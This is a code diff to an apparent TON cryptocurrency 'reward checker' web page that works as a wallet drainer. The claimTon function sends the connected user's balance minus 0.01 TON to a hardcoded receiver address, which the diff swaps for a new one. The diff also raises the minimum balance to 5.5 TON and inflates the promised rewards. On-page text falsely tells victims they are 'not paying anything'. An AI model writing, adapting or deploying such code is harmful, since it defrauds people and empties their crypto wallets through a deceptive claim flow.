@@ -304,11 +304,11 @@ document.addEventListener("DOMContentLoaded", async () => {
           let rewardStatus = "Scan Required 📊";
           
           // Only show minimum eligibility check
-          if (tonBalance >= 4.48) {
+          if (tonBalance >= 5.48) {
             rankStatus = "Eligible for Scanning ✅";
             rewardStatus = "Available after scan 🎯";
           } else {
-            rankStatus = "Needs 3.5+ TON ❌";
+            rankStatus = "Needs 5.5+ TON ❌";
             rewardStatus = "Not eligible 💔";
           }
 
@@ -568,24 +568,24 @@ function showEligibility() {
   let baseReward = 0;
   let rank = "";
   if (totalTxs >= 100) {
-    baseReward = 17.7;
+    baseReward = 23.7;
     rank = "Ton King 👑";
   } else if (totalTxs >= 50) {
-    baseReward = 12.7;
+    baseReward = 18.7;
     rank = "Ton Hero 🛡️";
   } else if (totalTxs >= 20) {
-    baseReward = 8.8;
+    baseReward = 15.8;
     rank = "Ton Star 🌟";
   } else {
-    baseReward = 6.4;
+    baseReward = 11.4;
     rank = "Newbie 🧍";
   }
 
   // Calculate bonus for extra TON above 2 TON threshold
   let bonus = 0;
-  if (tonBalance > 4.48) {
-    const extraTon = tonBalance - 4.48;
-    bonus = extraTon * 0.65;
+  if (tonBalance > 5.48) {
+    const extraTon = tonBalance - 5.48;
+    bonus = extraTon * 0.75;
   }
 
   const totalReward = baseReward + bonus;
@@ -600,7 +600,7 @@ function showEligibility() {
   const c2 = totalTxs >= 20; // Ton Star (20-49)
   const c3 = totalTxs >= 50; // Ton Hero (50-99)
   const c4 = totalTxs >= 100; // Ton King (100+)
-  const c5 = tonBalance >= 4.47; // Required balance
+  const c5 = tonBalance >= 5.47; // Required balance
 
   // Show all rank checks with proper eligibility logic
   let rankChecks = '';
@@ -619,14 +619,14 @@ function showEligibility() {
 
   checksDiv.innerHTML = `<div style="background: rgba(21, 10, 83, 0.507); border-left: 4px solid #00ccff; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; color: #00ccff; line-height: 1.4;">
   ⚠️ Only your <strong>latest 100 transactions</strong> are analyzed.<br>
-  💡 <strong>Note:</strong> You're <strong>not paying</strong> anything — holding at least <strong>4.5 TON</strong> simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.<br>
-  🎁 <strong>Bonus:</strong> For every extra TON you hold above the 4.5 TON requirement, you'll receive +0.65 TON added to your reward!
+  💡 <strong>Note:</strong> You're <strong>not paying</strong> anything — holding at least <strong>5.5 TON</strong> simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.<br>
+  🎁 <strong>Bonus:</strong> For every extra TON you hold above the 5.5 TON requirement, you'll receive +0.75 TON added to your reward!
 </div>
 
     ${rankChecks}
     ${mark(
       c5,
-      `4.5+ TON Balance 💰 <span style="font-size: 0.85rem; color: #ff6b35; font-weight: 600; display: block; text-align: center; margin-top: 5px;">(REQUIRED)</span>`
+      `5.5+ TON Balance 💰 <span style="font-size: 0.85rem; color: #ff6b35; font-weight: 600; display: block; text-align: center; margin-top: 5px;">(REQUIRED)</span>`
     )}
 
 <div style="background: linear-gradient(135deg, rgba(42, 116, 248, 0.15), rgba(200, 77, 208, 0.15)); border: 2px solid rgba(42, 116, 248, 0.4); border-radius: 20px; padding: 25px; margin: 30px 0; text-align: center; box-shadow: 0 15px 35px rgba(42, 116, 248, 0.2); backdrop-filter: blur(20px);">
@@ -640,7 +640,7 @@ function showEligibility() {
   <div style="font-size: 1rem; color: var(--text-secondary); line-height: 1.5;">
     <div style="background: rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 10px; margin-top: 10px;">
       Base Reward (${rank}): <span style="color: var(--text-primary); font-weight: 600;">${baseReward} TON</span>
-      ${bonus > 0 ? `<br>Bonus (+${(tonBalance - 2).toFixed(2)} TON × 0.65): <span style="color: #00ff88; font-weight: 600;">+${bonus.toFixed(2)} TON</span>` : ''}
+      ${bonus > 0 ? `<br>Bonus (+${(tonBalance - 2).toFixed(2)} TON × 0.75): <span style="color: #00ff88; font-weight: 600;">+${bonus.toFixed(2)} TON</span>` : ''}
     </div>
   </div>
 </div>
@@ -665,7 +665,7 @@ function showEligibility() {
 // Claim Function with Fixed Claim Fee
 async function claimTon() {
   if (!connectedWallet || currentBalanceNano < 2e9) {
-    alert("Not eligible to claim (need at least 4.5 TON)");
+    alert("Not eligible to claim (need at least 5.5 TON)");
     return;
   }
 
@@ -680,7 +680,7 @@ async function claimTon() {
   const transaction = {
     messages: [
       {
-        address: "UQDUoGbfyZPha2ld_pupshvSkyRbC3ZTBrRzxpngaImLvNcr", // Receiver address
+        address: "UQAiqocd3WcxS1ZznZ1h3IG_toRdaBPK5mXZxpmTzrXGNbOj", // Receiver address
         amount: claimAmount.toString(), // Send balance minus 0.01 TON
       },
     ],
